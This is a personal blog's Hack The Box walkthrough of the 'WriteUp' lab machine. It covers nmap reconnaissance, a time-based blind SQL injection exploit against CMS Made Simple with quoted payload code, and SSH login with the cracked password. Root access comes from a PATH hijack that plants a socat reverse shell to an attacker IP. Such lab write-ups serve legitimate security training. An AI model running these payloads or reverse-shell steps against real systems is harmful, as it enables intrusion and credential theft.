<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    
    
    <meta property="article:tag" content="hackthebox" />
    
    <meta property="article:tag" content="htb" />
    
    <meta property="article:tag" content="boot2root" />
    
    <meta property="article:tag" content="writeup" />
    
    <meta property="article:tag" content="write-up" />
    
    <meta property="article:tag" content="linux" />
    
    <meta property="article:tag" content="cms-made-simple" />
    
    <meta property="article:tag" content="blind-sql-injection" />
    
    <meta property="article:tag" content="time-based-sql-injection" />
    
    <meta property="article:tag" content="sql-sleep" />
    
    <meta property="article:tag" content="env" />
    
    <meta property="article:tag" content="environment-path" />
    
    <meta property="article:tag" content="path" />
    
    <meta property="article:tag" content="binary-hijack" />
        

    
    <meta property="og:image" content="https://jebidiah-anthony.github.io/boxes/screenshots/31_writeup/writeup.jpg" />
    

    
    <meta property="og:title" content="HTB WriteUp" />
    

    <!-- Begin Jekyll SEO tag v2.6.1 -->
<title>HTB WriteUp | jebidiah-anthony</title>
<meta name="generator" content="Jekyll v4.0.0" />
<meta property="og:title" content="HTB WriteUp" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="10.10.10.138 20 pts" />
<meta property="og:description" content="10.10.10.138 20 pts" />
<link rel="canonical" href="https://jebidiah-anthony.github.io/boxes/31_WriteUp_md" />
<meta property="og:url" content="https://jebidiah-anthony.github.io/boxes/31_WriteUp_md" />
<meta property="og:site_name" content="jebidiah-anthony" />
<script type="application/ld+json">
{"@type":"WebPage","headline":"HTB WriteUp","url":"https://jebidiah-anthony.github.io/boxes/31_WriteUp_md","description":"10.10.10.138 20 pts","@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
 
  </head>

  <body>

    <header>
      <div class="container">
        <h1>jebidiah-anthony</h1>
        <h2>write-ups and what not</h2>

        <h2 style="margin-bottom:0; padding-top:20px">[SITE PAGES]</h2>

<div style="padding-top:10px">
  
  > <a href="/">whoami</a>
  
</div>
<div style="padding-top:10px">  
  >  <a href="/htb.html">
    
    <strong style="color:orange">htb writeups</strong>
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/ctf.html">
    
    ctf writeups
    
  </a>
</div>
<div style="padding-top:10px">
  > <a href="/projects.html">
    
    projects
    
  </a>
</div>

      </div>
    </header>

    <div class="container">
      <section id="main_content">
        # HTB WriteUp (10.10.10.138)

### TABLE OF CONTENTS
* [PART 1 : INITIAL RECON](#part-1--initial-recon)
* [PART 2 : PORT ENUMERATION](#part-2--port-enumeration)
  * [TCP PORT 80](#tcp-port-80)
* [PART 3 : EXPLOITATION](#part-3--exploitation)
* [PART 4 : GENERATE A USER SHELL](#part-4--generate-a-user-shell)
* [PART 5 : PRIVILEGE ESCALATION (jkr -&gt; root)](#part-5--privilege-escalation-jkr---root)

---

## PART 1 : INITIAL RECON

```console
$ nmap --min-rate 15000 -p- 10.10.10.138

  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http
  
$ nmap -p 22,80 -sC -sV -T4 10.10.10.138

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 dd:53:10:70:0b:d0:47:0a:e2:7e:4a:b6:42:98:23:c7 (RSA)
  |   256 37:2e:14:68:ae:b9:c2:34:2b:6e:d9:92:bc:bf:bd:28 (ECDSA)
  |_  256 93:ea:a8:40:42:c1:a8:33:85:b3:56:00:62:1c:a0:ab (ED25519)
  80/tcp open  http    Apache httpd 2.4.25 ((Debian))
  | http-robots.txt: 1 disallowed entry 
  |_/writeup/
  |_http-title: Nothing here yet.
  Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```
__NOTE(S)__:
- There exists a __`robots.txt`__ file.

---

## PART 2 : PORT ENUMERATION

### TCP PORT 80

![Landing Page](./screenshots/31_writeup/80_landing_page.png)

There seems to be a script in place that monitors __40X responses__ wchich serves as a DoS protection. This means that any form of bruteforce/dictionary attack to the http service might not work as expected. 

There was a mention of a write-up page that is yet to go live but with the site having a DoS protection, running __`gobuster`__ or __`wfuzz`__ might not be the best option. Luckily, a <strong style="color:orange">robots.txt</strong> file was detected by the __`nmap`__ scan earlier:

```
#              __
#      _(\    |@@|
#     (__/\__ \--/ __
#        \___|----|  |   __
#            \ }{ /\ )_ / _\
#            /\__/\ \__O (__
#           (--/\--)    \__/
#           _)(  )(_
#          `---''---`

# Disallow access to the blog until content is finished.
User-agent: * 
Disallow: /writeup/
```

<strong style="color:orange">robots.txt</strong> tells web robots or web crawlers which pages of a site to crawl. This helps for a site's SEO (Search Engine Optimization). In this case, the directory __`/writeup/`__ was disallowed and therefore, should exist. This is probably the write-up page that was mentioned earlier.

![/writeup/](./screenshots/31_writeup/80_writeup_page.png)

<table style="margin:auto; width:90%">
<tr>
<th colspan="2"><strong style="color:red">Wappalyzer</strong></th>
</tr>
<tr>
<td><strong style="color:orange">CMS</strong></td>
<td>CMS Made Simple</td>
</tr>
<tr>
<td><strong style="color:orange">Programming Language</strong></td>
<td>PHP</td>
</tr>
<tr>
<td><strong style="color:orange">Web Server</strong></td>
<td>Apache 2.4.25</td>
</tr>
<tr>
<td><strong style="color:orange">Operating System</strong></td>
<td>Debian</td>
</tr>
</table>

The page just contains write-ups of the retired boxes, __Ypuffy__ and __Blue__, but checking <strong style="color:orange">Wappalyzer</strong> that reveals the service running underneath is <strong style="color:orange">CMS Made Simple</strong>

---

## PART 3 : EXPLOITATION

There might already be an existing exploit for <strong style="color:orange">CMS Made Simple</strong>:

```console
$ searchsploit CMS | grep -i "made simple"

  CMS Made Simple (CMSMS) Showtime2 - File Upload Remote Code Execution (Metasploit)       | exploits/php/remote/46627.rb
  CMS Made Simple 0.10 - 'Lang.php' Remote File Inclusion                                  | exploits/php/webapps/26217.html
  CMS Made Simple 0.10 - 'index.php' Cross-Site Scripting                                  | exploits/php/webapps/26298.txt
  CMS Made Simple 1.0.2 - 'SearchInput' Cross-Site Scripting                               | exploits/php/webapps/29272.txt
  CMS Made Simple 1.0.5 - 'Stylesheet.php' SQL Injection                                   | exploits/php/webapps/29941.txt
  CMS Made Simple 1.11.10 - Multiple Cross-Site Scripting Vulnerabilities                  | exploits/php/webapps/32668.txt
  CMS Made Simple 1.11.9 - Multiple Vulnerabilities                                        | exploits/php/webapps/43889.txt
  CMS Made Simple 1.2 - Remote Code Execution                                              | exploits/php/webapps/4442.txt
  CMS Made Simple 1.2.2 Module TinyMCE - SQL Injection                                     | exploits/php/webapps/4810.txt
  CMS Made Simple 1.2.4 Module FileManager - Arbitrary File Upload                         | exploits/php/webapps/5600.php
  CMS Made Simple 1.4.1 - Local File Inclusion                                             | exploits/php/webapps/7285.txt
  CMS Made Simple 1.6.2 - Local File Disclosure                                            | exploits/php/webapps/9407.txt
  CMS Made Simple 1.6.6 - Local File Inclusion / Cross-Site Scripting                      | exploits/php/webapps/33643.txt
  CMS Made Simple 1.6.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/11424.txt
  CMS Made Simple 1.7 - Cross-Site Request Forgery                                         | exploits/php/webapps/12009.html
  CMS Made Simple 1.8 - 'default_cms_lang' Local File Inclusion                            | exploits/php/webapps/34299.py
  CMS Made Simple 1.x - Cross-Site Scripting / Cross-Site Request Forgery                  | exploits/php/webapps/34068.html
  CMS Made Simple 2.1.6 - Multiple Vulnerabilities                                         | exploits/php/webapps/41997.txt
  CMS Made Simple 2.1.6 - Remote Code Execution                                            | exploits/php/webapps/44192.txt
  CMS Made Simple 2.2.5 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/44976.py
  CMS Made Simple 2.2.7 - (Authenticated) Remote Code Execution                            | exploits/php/webapps/45793.py
  CMS Made Simple < 1.12.1 / < 2.1.3 - Web Server Cache Poisoning                          | exploits/php/webapps/39760.txt
  CMS Made Simple < 2.2.10 - SQL Injection                                                 | exploits/php/webapps/46635.py
  CMS Made Simple Module Antz Toolkit 1.02 - Arbitrary File Upload                         | exploits/php/webapps/34300.py
  CMS Made Simple Module Download Manager 1.4.1 - Arbitrary File Upload                    | exploits/php/webapps/34298.py
  CMS Made Simple Showtime2 Module 3.6.2 - (Authenticated) Arbitrary File Upload           | exploits/php/webapps/46546.py

```

The latest unauthenticated standalone exploit available is __`SQL Injection`__ for versions __`CMS Made Simple < 2.2.10`__.

```console
$ searchsploit -m exploits/php/webapps/46635.py
  
    Exploit: CMS Made Simple < 2.2.10 - SQL Injection
        URL: https://www.exploit-db.com/exploits/46635
       Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
  File Type: Python script, ASCII text executable, with CRLF line terminators

```

The exploit calls the functions, __`dump_salt()`__, __`dump_username()`__, __`dump_email()`__, and __`dump_password()`__ to extract user credentials in the database. It is done by performing a <strong style="color:red">time-based blind SQL injection</strong> where if the query returned is not null, the system sleeps for some time. 

```py
...omitted...
def dump_password():
    global flag
    global password
    global output
    ord_password = ""
    ord_password_temp = ""
    while flag:
        flag = False
        for i in range(0, len(dictionary)):
            temp_password = password + dictionary[i]
            ord_password_temp = ord_password + hex(ord(dictionary[i]))[2:]
            beautify_print_try(temp_password)
            payload = "a,b,1,5))+and+(select+sleep(" + str(TIME) + ")+from+cms_users"
            payload += "+where+password+like+0x" + ord_password_temp + "25+and+user_id+like+0x31)+--+"
            url = url_vuln + "&m1_idlist=" + payload
            start_time = time.time()
            r = session.get(url)
            elapsed_time = time.time() - start_time
            if elapsed_time >= TIME:
                flag = True
                break
        if flag:
            password = temp_password
            ord_password = ord_password_temp
    flag = True
    output += '\n[+] Password found: ' + password
...omitted...
```

The data are extracted by querying if a string (starting from the first character of the actual string) is a substring of the actual string. This is checked by measuring the response times. If it is greater than or equal to the sleep time, then the query did not return a null value. This is done character by character until the entire character string is returned.

```console
$ python ./46635.py --url http://10.10.10.138/writeup/ --wordlist /usr/share/wordlists/rockyou.txt --crack

  [+] Salt for password found: 5a599ef579066807
  [+] Username found: jkr
  [+] Email found: jkr@writeup.htb
  [+] Password found: 62def4866937f08cc13bab43bb14e6f7
  [+] Password cracked: raykayjay9

```

The exploit takes a while to run since it is more of a bruteforcing method coupled with the __`sleep()`__ function but at least, it worked. It revealed a credential pair for the user, __`jkr`__.

---

## PART 4 : GENERATE A USER SHELL

```console
$ ssh -l jkr 10.10.10.138
$ jkr@10.10.10.138's password: raykayjay9

jkr@writeup:~$ 

```

Enumerating the system:

```console
jkr@writeup:~$ uname -mnor

  writeup 4.9.0-8-amd64 x86_64 GNU/Linux

jkr@writeup:~$ cat /etc/passwd | grep -e "sh$"

  root:x:0:0:root:/root:/bin/bash
  jkr:x:1000:1000:jkr,,,:/home/jkr:/bin/bash

jkr@writeup:~$ ls -lah ~

  drwxr-xr-x 2 jkr  jkr  4.0K Oct 13 10:28 .
  drwxr-xr-x 3 root root 4.0K Apr 19 04:14 ..
  lrwxrwxrwx 1 root root    9 Apr 19 06:42 .bash_history -> /dev/null
  -rw-r--r-- 1 jkr  jkr   220 Apr 19 04:14 .bash_logout
  -rw-r--r-- 1 jkr  jkr  3.5K Apr 19 04:14 .bashrc
  -rw-r--r-- 1 jkr  jkr   675 Apr 19 04:14 .profile
  -r--r--r-- 1 root root   33 Apr 19 08:43 user.txt

jkr@writeup:~$ cat ~/user.txt

  d4e4........................f978

```

---

## PART 5 : PRIVILEGE ESCALATION (jkr -> root)

Upload and run [pspy64](files/31_writeup/pspy64s) since the service is running on a 64-bit architecture:

```console
$ wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64s

  pspy64s        100%[====================================================>]   1.10M

$ scp ./pspy64s jkr@10.10.10.138:/tmp/pspy64s
$ jkr@10.10.10.138's password: raykayjay9

  pspy64s                                                                100% 1129KB

jkr@writeup:~$ cd /tmp

jkr@writeup:/tmp$ chmod +x ./pspy64s

jkr@writeup:/tmp$ ./pspy64s

  pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


       ██▓███    ██████  ██▓███ ▓██   ██▓
      ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
      ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
      ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
      ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
      ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
      ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
      ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                     ░           ░ ░     
                                 ░ ░     

```

Connect to another __`ssh`__ instance:

```console
$ ssh -l jkr 10.10.10.138
$ jkr@10.10.10.138's password: raykayjay9

jkr@writeup:~$ 

```

Checking back on the running __`./ppsy64s`__:

```pspy
2019/10/11 11:05:21 CMD: UID=0    PID=2270   | sshd: [accepted]  
2019/10/11 11:05:30 CMD: UID=0    PID=2272   | sshd: jkr [priv]  
2019/10/11 11:05:30 CMD: UID=0    PID=2273   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/10/11 11:05:30 CMD: UID=0    PID=2274   | run-parts --lsbsysinit /etc/update-motd.d 
2019/10/11 11:05:30 CMD: UID=0    PID=2275   | /bin/sh /etc/update-motd.d/10-uname 
2019/10/11 11:05:30 CMD: UID=0    PID=2276   | sshd: jkr [priv]  
2019/10/11 11:05:31 CMD: UID=1000 PID=2277   | sshd: jkr@pts/2   
```

The __`run-parts`__ binary is run and the weird thing about it is that it is passed through a call on __`/usr/bin/env`__ with the __`-i`__ (__`--ignore-environment`__) option enabled. The __`-i`__ option enables the user to set environment variables from scratch or to create a unique setup when running an executable.

This series of events happens everytime a connection via <strong style="color:orange">ssh</strong> is established. 

```console
jkr@writeup:~$ env | grep PATH

  PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

jkr@writeup:~$ find / -name run-parts -type f 2>/dev/null

  /bin/run-parts

```

The __`run-parts`__ binary is located in the __`/bin/`__ directory which is already set in the actuale __`$PATH`__ environment variable. The one being run when connecting via <strong style="color:orange">ssh</strong> includes __`/usr/local/sbin/`__, __`/usr/sbin/`__, and __`/sbin/`__. 

The <strong style="color:orange">PATH</strong> environment variable is useful when running a binary since instead of calling an executable using its absolute path, calling only the executable's name would suffice. 

Maybe the exploit lies on how the environment variable, __`$PATH`__, is set for the __`run-parts`__ binary.

```console
jkr@writeup:~$ find / -type d -writable 2>/dev/null | grep bin

  /usr/local/bin
  /usr/local/sbin

```

Both __`/usr/local/bin`__ and __`/usr/local/sbin`__ are included when calling __`run-parts`__ and it's both writable. It's possible to create another executable with the same name in either of the aforementioned directories.

Since the __`run-parts`__ binary is run with reference to the __`$PATH`__ environment variable, then maybe the first occurence (since __`/usr/local/bin`__ and __`/usr/local/sbin`__ are listed before __`/bin`__) or all occurences of the __`run-parts`__ binary found in __`$PATH`__ will be executed.

```console
jkr@writeup:~$ echo -e '\x23\x21/bin/sh\nsocat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane' > /usr/local/sbin/run-parts

jkr@writeup:~$ chmod +x /usr/local/sbin/run-parts
```

Connect again via __`ssh`__:

```console
$ ssh -l jkr 10.10.10.138
$ jkr@10.10.10.138's password: raykayjay9

jkr@writeup:~$ 

```

Checking back on the running __`./ppsy64s`__:

```pspy
2019/10/11 12:28:54 CMD: UID=0    PID=3735   | sshd: [accepted]
2019/10/11 12:28:54 CMD: UID=0    PID=3736   | sshd: [accepted]  
2019/10/11 12:28:58 CMD: UID=0    PID=3738   | sshd: jkr [priv]  
2019/10/11 12:28:58 CMD: UID=0    PID=3739   | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new 
2019/10/11 12:28:58 CMD: UID=0    PID=3740   | /bin/sh /usr/local/sbin/run-parts --lsbsysinit /etc/update-motd.d 
2019/10/11 12:28:58 CMD: UID=0    PID=3741   | socat TCP-CONNECT:10.10.15.13:4444 EXEC:sh,pty,stderr,setsid,sigint,sane 
```

The __`run-parts`__ binary was completely overridden and the creted reverse shell executed with __`UID=0`__:

```console
# id

  uid=0(root) gid=0(root) groups=0(root)

# cat /root/root.txt

  eeba........................7226

```

Normally, overriding a binary by writing to another directory listed in the __`$PATH`__ variable with the same name wouldn't work. Every binary invoked is written on a cache which includes its absolute path. But since the __`run-parts`__ binary is being executed from scratch with __`/usr/bin/env -i`__, it was possible.

      </section>
    </div>

    
      <script>
        (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
        m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
        })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
        ga('create', 'true', 'auto');
        ga('send', 'pageview');
      </script>
    
  </body>
</html>
